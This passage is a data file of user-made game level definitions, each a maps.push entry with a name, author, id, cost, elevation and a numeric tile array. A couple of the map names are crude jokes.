1,91,91,91,91,91,91,91,1,14,90,14,1,1,0,1,1,91,91,91,91,91,91,91,91,91,91,91,1,14,14,14,93,1,0,0,1,1,91,91,91,91,91,91,91,91,91,91,14,14,14,14,90,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,90,14,14,14,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,94,14,14,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,94,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,94,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0]});
maps.push({name="Breakable Sabotage",author="MoistNoodlez",id="#1661030364",direction="forward",cost=161,elevation=-5,map=[0,0,0,0,0,0,0,19,19,2,2,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,14,91,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,89,14,91,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,14,89,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,14,91,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,89,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,14,91,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,89,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,14,91,14,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,91,14,91,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,88,2,2,88,88,0,0,0,0,0,0,0]});
maps.push({name="Underwater Mountain",author="MoistNoodlez",id="#1661031626",direction="left",cost=280,elevation=-9,map=[0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,67,66,66,67,1,1,1,1,1,1,0,0,0,2,5,66,67,66,120,95,65,67,67,65,120,119,119,119,119,1,0,0,0,2,5,66,67,66,120,95,120,54,54,120,120,119,119,119,119,1,0,0,0,1,1,1,1,1,1,1,115,115,115,115,1,1,1,118,118,1,0,0,0,0,0,0,0,0,0,1,115,66,66,115,1,93,1,118,118,1,0,0,0,0,0,0,0,0,0,1,115,69,69,115,1,116,1,118,118,1,0,0,0,0,0,0,0,0,0,1,69,69,69,69,69,66,1,118,118,1,0,0,0,0,0,0,0,0,0,1,69,69,69,69,1,1,1,118,118,1,0,0,0,0,0,0,0,0,0,1,69,69,69,69,69,69,66,116,116,1,0,0,0,0,0,0,0,0,0,1,69,69,69,69,69,69,66,116,116,1,0,0,0,0,0,0,0,0,0,1,69,69,69,69,69,69,66,116,116,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0]});
maps.push({name="Waterfall Mountain",author="MoistNoodlez",id="#1661033650",direction="forward",cost=247,elevation=-9,map=[0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,14,14,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,125,125,125,125,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,65,65,65,65,1,1,1,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,124,124,115,115,115,1,0,0,0,0,0,0,0,0,0,1,124,124,115,115,115,115,115,66,66,1,0,0,0,0,0,0,0,0,0,1,123,123,115,115,115,88,1,69,69,1,0,0,0,0,0,0,0,0,0,1,123,123,115,76,76,115,1,69,69,1,0,0,0,0,0,0,0,0,0,1,123,123,115,115,115,88,1,69,69,1,0,0,0,0,0,0,0,0,0,1,122,122,115,115,115,115,1,69,69,1,0,0,0,0,0,0,0,0,0,1,122,122,114,114,114,114,1,69,69,1,0,0,0,0,0,0,0,0,0,1,122,122,115,115,115,115,1,69,69,1,0,0,0,0,0,0,0,0,0,1,121,121,116,116,116,116,1,67,67,1,0,0,0,0,0,0,0,0,0,1,121,121,117,117,117,117,1,66,66,1,0,0,0,0,0,0,0,0,0,1,120,88,119,119,118,118,1,5,5,1,0,0,0,0,0,0,0,0,0,1,120,120,119,119,118,88,1,5,5,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0]});
maps.push({name="Water Corridors",author="MoistNoodlez",id="#1661033783",direction="forward",cost=368,elevation=-5,map=[0,0,0,0,1,19,19,19,2,2,19,19,19,1,0,0,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,69,69,1,69,69,1,69,69,1,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,95,95,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Wat u Twat",author="MoistNoodlez",id="#1661047165",direction="forward",cost=186,elevation=5,map=[0,0,0,0,0,0,1,11,2,2,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,11,11,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,125,125,125,125,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,125,125,125,125,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,16,16,16,16,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,16,95,95,16,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="Breakable Split Hold",author="MoistNoodlez",id="#1661098806",direction="forward",cost=152,elevation=0,map=[0,0,0,0,0,88,94,14,2,2,14,94,88,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,14,102,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,103,103,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,104,14,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,101,101,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,14,99,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,97,14,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,88,93,14,2,2,14,93,88,0,0,0,0,0,0,0]});
maps.push({name="Penis Destination",author="MoistNoodlez",id="#1661100924",direction="forward",cost=240,elevation=0,map=[0,0,0,0,88,14,14,14,2,2,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,0,0,14,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,14,14,0,0,75,75,0,0,14,14,0,0,0,0,0,0,0,0,0,0,88,91,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,75,75,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,88,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,75,75,0,0,91,91,0,0,0,0,0,0,0,0,0,0,88,91,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,114,114,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,88,0,0,75,75,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,88,91,0,0,75,75,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,88,0,0,75,75,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,65,65,0,0,91,91,0,0,0,0,0,0,0,0,0,0,91,91,0,0,91,91,0,0,91,91,0,0,0,0,0,0,0,0,0,0,95,95,0,0,95,95,0,0,95,95,0,0,0,0,0,0,0,0,0,0,95,95,0,0,95,95,0,0,95,95,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,88,14,14,14,2,2,14,14,14,14,0,0,0,0,0,0]});
maps.push({name="crypt",author="fraz",id="#1661105648",direction="right",cost=456,elevation=0,map=[16,50,2,2,50,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,50,50,50,50,50,50,95,50,50,50,50,50,50,50,95,50,50,50,16,16,50,50,50,50,50,50,95,50,50,50,50,50,50,50,95,50,94,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,50,50,50,50,95,50,50,50,50,50,50,50,95,50,50,50,16,16,50,50,50,50,50,50,95,50,50,50,50,50,50,50,95,50,50,50,16,16,95,95,16,16,95,95,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,50,50,50,50,50,50,50,50,50,50,50,50,95,50,50,50,16,16,50,50,50,50,50,50,50,50,50,50,50,50,50,50,95,50,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,50,50,50,50,50,50,50,50,50,50,50,50,95,50,50,50,16,16,50,50,50,50,50,50,50,50,50,50,50,50,50,50,95,50,50,50,16,16,95,95,16,16,95,95,16,16,95,95,16,16,95,95,16,16,95,95,16,16,50,50,16,16,50,50,16,16,50,50,16,16,50,50,16,16,10,10,10,16,50,94,50,50,50,50,50,50,50,50,50,50,50,50,95,10,10,10,2,16,50,50,50,50,50,50,50,50,50,50,50,50,50,50,95,10,10,10,2,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,10,10,10,10]});
maps.push({name="pratformer",author="fraz",id="#1661107007",direction="right",cost=132,elevation=-10,map=[35,2,2,35,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,25,35,35,35,35,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,2,0,35,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,2,0,35,0,0,0,0,0,0,0,0,0,0,0,0,1,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,105,1,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,92,120,0,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,120,0,0,34,0,0,0,0,38,38,0,0,35,35,0,0,0,0,0,0,0,0,0,33,0,0,0,0,38,0,0,0,0,34,0,0,0,0,0,0,0,0,0,32,0,0,0,0,0,0,1,0,0,33,0,0,0,0,0,0,0,0,0,31,0,0,0,0,0,0,1,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,31,0,0,0,0,0,0,0,0,0,31,0,0,0,0,92,0,1,0,0,30,0,0,0,0,0,0,0,0,0,92,0,0,0,0,38,0,1,40,40,29,40,40,0,0,0,0,0,0,0,35,0,0,0,0,0,0,1,0,0,28,0,40,0,0,0,0,0,0,0,35,0,0,0,0,0,0,1,40,0,27,0,40,0,0,0,0,0,0,0,35,0,0,0,0,0,0,1,0,0,26,0,40,0,0,0,0,0,0,0,35,0,0,0,0,92,0,1,40,0,26,0,40,0,1,0,92,0,0,0,35,35,36,37,38,38,0,1,0,0,26,0,40,0,0,0,40,0,0,0,0,0,0,0,0,0,0,1,40,3,26,0,40,40,40,40,40,0,0]});
maps.push({name="In and out",author="Luffaren",id="#1661125260",direction="left",cost=252,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,67,24,24,2,2,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,67,24,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,0,0,0,67,24,24,24,24,24,24,67,0,0,0,0,0,0,0,0,0,44,85,0,67,24,90,24,24,90,24,67,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,124,124,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,1,0,0,0,0,0,0,0,0,0,85,0,0,0,0,1,123,123,123,123,1,0,0,0,0,0,0,0,0,0,44,0,0,0,0,1,122,122,122,122,1,0,0,0,0,0,44,85,0,0,0,0,0,0,0,1,121,121,121,121,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,121,89,121,121,1,0,0,0,85,0,0,0,0,0,0,0,0,0,0,1,121,121,121,121,1,0,0,0,44,0,0,0,0,0,0,0,0,0,0,1,90,121,121,90,1,0,0,24,24,24,1,1,1,1,1,1,1,1,1,1,1,95,95,1,1,0,0,24,24,90,1,124,123,122,121,121,94,121,90,1,121,121,121,121,1,0,0,2,24,24,95,124,123,122,121,121,121,121,121,121,121,65,65,121,1,0,0,2,132,24,95,124,123,122,121,89,121,121,121,121,121,65,65,121,1,0,0,24,24,90,1,124,123,122,121,121,94,121,90,1,121,121,121,121,1,0,0,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,131,0,67,67,67,0,44,0,0,44,0,0,44,0,0,44,0,0,44,93,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="water is your def",author="Kitty",id="#1661144691",direction="forward",cost=58,elevation=19,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,125,25,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,34,125,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="slidy",author="kitty",id="#1661145208",direction="right",cost=260,elevation=0,map=[2,2,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,135,135,1,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,95,2,135,135,1,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,95,2,135,135,1,0,0,0,0,1,135,135,1,1,1,1,1,1,1,1,1,1,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,0,0,0,0,1,135,135,1,0,0,0,0,0,0,0,0,0,135,135,1,1,1,1,1,1,135,135,1,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,95,135,1,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,95,135,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="Float",author="tilgep",id="#1661199570",direction="right",cost=130,elevation=12,map=[0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,130,130,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,125,130,130,125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,130,130,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,1,0,0,26,26,92,17,17,0,0,0,0,18,18,130,130,130,130,130,130,26,106,106,26,130,130,17,2,0,0,0,0,0,18,130,130,130,130,130,130,26,106,106,26,130,130,17,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,26,26,92,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RockClimbing V2",author="MoistNoodlez",id="#1661209503",direction="forward",cost=312,elevation=19,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,15,13,13,13,11,11,11,9,9,9,7,7,7,5,5,5,5,5,1,1,15,13,13,13,11,11,11,9,9,9,7,7,7,5,5,5,5,5,1,1,15,15,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,4,4,4,4,4,1,1,15,15,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,93,94,93,94,93,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,4,4,4,4,4,1,1,17,17,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,94,93,94,93,94,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,4,4,4,4,4,1,1,19,19,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,21,21,1,0,0,0,0,0,0,0,0,0,1,24,24,24,24,24,1,1,21,21,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,1,1,21,23,23,23,23,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,21,23,23,23,23,24,24,96,96,24,24,24,24,24,24,97,24,24,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Salmon Ladders",author="MoistNoodlez",id="#1661213060",direction="forward",cost=444,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,72,72,5,0,0,19,19,19,19,19,19,19,19,19,19,0,0,0,0,5,72,72,5,0,0,19,72,72,73,73,73,73,73,73,19,0,0,0,0,5,72,72,5,0,0,19,72,72,73,73,73,73,73,73,19,0,0,0,0,5,72,72,5,0,0,19,72,72,19,19,19,19,66,66,19,0,0,0,0,5,72,72,5,0,0,19,72,72,19,0,0,3,67,67,3,0,0,0,0,5,66,66,5,0,0,19,72,72,19,0,0,14,66,66,14,0,0,0,0,3,67,67,3,0,0,19,72,72,19,0,0,14,71,71,14,0,0,0,0,9,66,66,9,0,0,19,66,66,19,0,0,14,71,71,14,0,0,0,0,9,72,72,9,0,0,3,67,67,3,0,0,14,71,71,14,0,0,0,0,9,72,72,9,0,0,24,66,66,24,0,0,14,71,71,14,0,0,0,0,9,72,72,9,0,0,24,72,72,24,0,0,14,71,71,14,0,0,0,0,9,72,72,9,0,0,24,72,72,24,0,0,14,71,71,14,0,0,0,0,9,72,72,9,0,0,24,72,72,24,0,0,14,71,71,14,3,9,9,9,9,72,72,9,0,0,24,72,72,24,0,0,14,71,71,66,67,66,73,73,73,73,73,9,0,0,24,72,72,24,0,0,14,71,71,66,67,66,73,73,73,73,73,9,0,0,24,66,66,24,0,0,14,14,14,14,3,9,9,9,9,9,9,9,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="City SkyBridge",author="MoistNoodlez",id="#1661213339",direction="forward",cost=248,elevation=4,map=[0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,113,113,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,113,113,88,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,1,113,113,113,113,33,33,33,33,53,54,55,88,1,0,0,1,1,1,0,1,113,113,113,113,33,33,33,33,53,54,55,55,1,0,1,123,123,100,1,1,88,113,113,88,1,0,0,1,119,1,56,56,1,0,1,88,123,123,1,0,1,1,1,1,0,0,0,1,118,118,57,57,43,43,43,43,123,88,1,0,0,0,0,0,0,0,0,1,88,118,57,57,43,43,43,43,123,88,1,0,0,0,0,0,0,0,0,0,1,1,43,43,94,0,1,88,123,123,1,0,1,1,1,1,1,0,0,0,0,0,43,43,0,0,1,123,123,123,1,1,100,123,123,123,88,1,0,0,0,0,43,43,0,0,1,88,123,123,1,1,88,123,123,123,123,43,43,43,43,43,43,43,0,0,0,1,123,123,1,1,88,123,123,123,123,43,43,43,43,43,43,43,0,0,0,0,0,0,0,1,123,123,123,123,88,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,123,92,92,92,123,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,123,57,57,57,123,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,123,57,57,57,123,1,0,0,0,0,0,0,0,0,0,35,66,66,35,1,1,1,117,1,1,1,0,0,0,0,0,0,0,0,0,36,66,66,36,0,0,0,37,0,0,0,0,0,0,0,0,0,0,0,37,37,37,37,37,0,0,93,37,37,37,37,37,37,37,37,37,37,37,37,37,2,2,37,93]});
maps.push({name="Rapids",author="MoistNoodlez",id="#1661214381",direction="right",cost=458,elevation=-18,map=[0,0,24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,24,72,72,24,1,10,10,10,10,10,8,8,8,6,6,6,6,6,0,0,24,72,72,24,1,10,74,74,74,74,67,74,74,67,74,74,66,2,0,0,24,72,72,24,1,10,74,74,74,74,67,74,74,67,74,74,66,2,0,0,22,67,67,22,1,10,71,71,10,10,8,8,8,6,6,6,6,6,0,0,22,72,72,22,1,10,67,67,10,0,0,0,0,0,0,0,0,0,0,0,22,72,72,22,1,12,71,71,12,0,0,0,0,0,0,0,0,0,0,0,22,72,72,22,1,12,71,71,12,14,14,14,14,0,0,0,0,0,0,0,22,72,72,22,1,12,71,71,67,73,73,73,14,0,0,0,0,0,0,0,20,67,67,20,1,12,71,71,67,73,73,73,14,0,0,0,0,0,0,0,20,72,72,20,1,12,12,12,12,14,71,71,14,0,0,0,0,0,0,0,20,72,72,20,1,0,0,0,0,14,71,71,14,0,0,0,0,0,0,0,20,72,72,20,1,0,0,0,0,14,71,71,14,0,0,0,0,0,0,0,20,72,72,20,1,0,0,0,0,14,71,71,14,0,0,0,0,0,0,0,20,72,72,20,1,0,0,0,0,14,67,67,14,0,0,0,0,0,0,0,20,72,72,20,18,18,18,16,16,16,71,71,16,0,0,0,0,0,0,0,20,74,74,74,67,74,74,67,74,74,71,71,16,0,0,0,0,0,0,0,20,74,74,74,67,74,74,67,74,74,71,71,16,0,0,0,0,0,0,0,20,20,20,20,18,18,18,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
